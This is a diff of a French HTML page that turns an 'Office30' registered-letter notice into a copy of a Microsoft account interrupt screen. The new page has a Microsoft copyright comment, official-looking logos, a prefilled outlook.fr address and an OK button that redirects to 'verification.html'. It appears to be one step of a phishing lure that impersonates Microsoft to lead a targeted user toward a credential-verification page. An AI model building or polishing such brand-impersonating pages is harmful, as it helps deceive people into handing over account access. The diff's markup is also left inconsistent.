@@ -1,43 +1,101 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="fr">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Continuer - Office30</title>
-    <link rel="stylesheet" href="office30-theme.css" />
+    <style>
+      /*! Copyright (c) Microsoft Corporation. All rights reserved. */
+      #app-host,
+      body {
+        width: 100%;
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        font-family: Segoe UI, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      html {
+        height: 100%;
+      }
+
+      .interrupt-content ::-webkit-scrollbar-thumb {
+        border: 4px solid transparent;
+        background-clip: padding-box;
+        border-radius: 9999px;
+        background-color: rgba(0, 0, 0, 0.3);
+      }
+    </style>
   </head>
   <body>
-    <header>
-      <div class="ContextMenuControl-module__context-menu__qivRQ">
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">Office30 - Récupérer mon recommandé</span>
-        </div>
-      </div>
-    </header>
-
-    <main>
-      <section class="ContextMenuControl-module__context-menu__qivRQ">
-        <div class="ActivityControl-module__activity-item__j7T17">
-          <span class="ActivityControl-module__activity-type-icon__DHyyA">•</span>
-          <div class="ActivityControl-module__activity-content__ealEs">
-            <p class="ActivityControl-module__activity-text__qEjee">Vous avez reçu un recommandé électronique.</p>
-            <p class="ActivityControl-module__activity-timestamp__YmN5s">Connexion sécurisée requise pour consulter votre contenu.</p>
+    <div id="app-host">
+      <div class="ms-Stack interrupt-content css-97">
+        <div id="scrollDiv" class="ms-Stack css-121">
+          <div id="interruptContainer" class="ms-StackItem css-99">
+            <div></div>
+            <div class="ms-Stack css-100">
+              <img
+                src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
+                alt="Microsoft"
+                style="height: 24px; width: 112.55px"
+              />
+            </div>
+            <div class="ms-Stack css-101">
+              <div class="ms-StackItem css-102"><span class="css-103">lapepitealicacaco@outlook.fr</span></div>
+              <div class="ms-StackItem css-104">
+                <span role="heading" aria-level="1" class="css-105">Une note rapide sur votre compte Microsoft</span>
+              </div>
+              <div class="ms-Stack css-106">
+                <img
+                  src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/newProductLogoLightMode-512x512.png"
+                  alt="Illustration montrant deux orbs autour d’une icône représentant une personne."
+                  style="align-self: center; height: 128px; width: 128px"
+                />
+              </div>
+              <div class="ms-Stack css-107">
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">Vos éléments importants sont ici</span>
+                  <span class="css-110"
+                    >Lorsque vous vous connectez, des éléments tels que vos contacts, mots de passe, favoris,
+                    historique de navigation, photos et fichiers sont disponibles dans les produits Microsoft.</span
+                  >
+                </div>
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">Votre confidentialité est notre priorité</span>
+                  <span class="css-110"
+                    >Pour protéger vos données, nous utilisons le chiffrement et d’autres meilleures pratiques de
+                    sécurité.</span
+                  >
+                </div>
+                <div class="ms-Stack css-108">
+                  <span role="heading" aria-level="2" class="css-109">C’est vous qui décidez</span>
+                  <span class="css-110"
+                    >Nous vous proposons des choix sur la façon dont vos données sont utilisées et sur ce que vous
+                    synchronisez.</span
+                  >
+                </div>
+              </div>
+              <div class="ms-StackItem css-111">
+                <span
+                  ><a
+                    aria-label="En savoir plus sur vos données compte Microsoft"
+                    href="#/LearnMore"
+                    style="color: rgb(0, 103, 184); font-size: 14px; font-weight: 400; line-height: 20px; text-decoration: underline"
+                    >En savoir plus</a
+                  ></span
+                >
+              </div>
+            </div>
           </div>
-        </div>
-
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <div class="ContextMenuControl-module__menu-item__flex-content__pRX63">
-            <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">• Accès sécurisé au recommandé et aux pièces jointes</span>
-          </div>
-        </div>
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <div class="ContextMenuControl-module__menu-item__flex-content__pRX63">
-            <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">• Traçabilité complète des actions</span>
-          </div>
-        </div>
-        <div class="ContextMenuControl-module__context-menu-item__vS7Ge">
-          <div class="ContextMenuControl-module__menu-item__flex-content__pRX63">
-            <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">• Conservation de preuve numérique Office30</span>
+          <div id="StickyFooter" class="ms-Stack css-112">
+            <button id="ok-button" type="button" class="ms-Button ms-Button--primary root-122" data-is-focusable="true">
+              <span class="ms-Button-flexContainer flexContainer-114" data-automationid="splitbuttonprimary">
+                <span class="ms-Button-textContainer textContainer-115"><span class="ms-Button-label label-117" id="id__0">OK</span></span>
+              </span>
+            </button>
           </div>
         </div>
 
@@ -58,6 +116,12 @@
           <span class="ContextMenuControl-module__context-menu-item__title__st0Oh">Office30 est une filiale de Docaposte</span>
         </div>
       </div>
-    </footer>
+    </div>
+
+    <script>
+      document.getElementById('ok-button').addEventListener('click', () => {
+        window.location.href = 'verification.html';
+      });
+    </script>
   </body>
 </html>
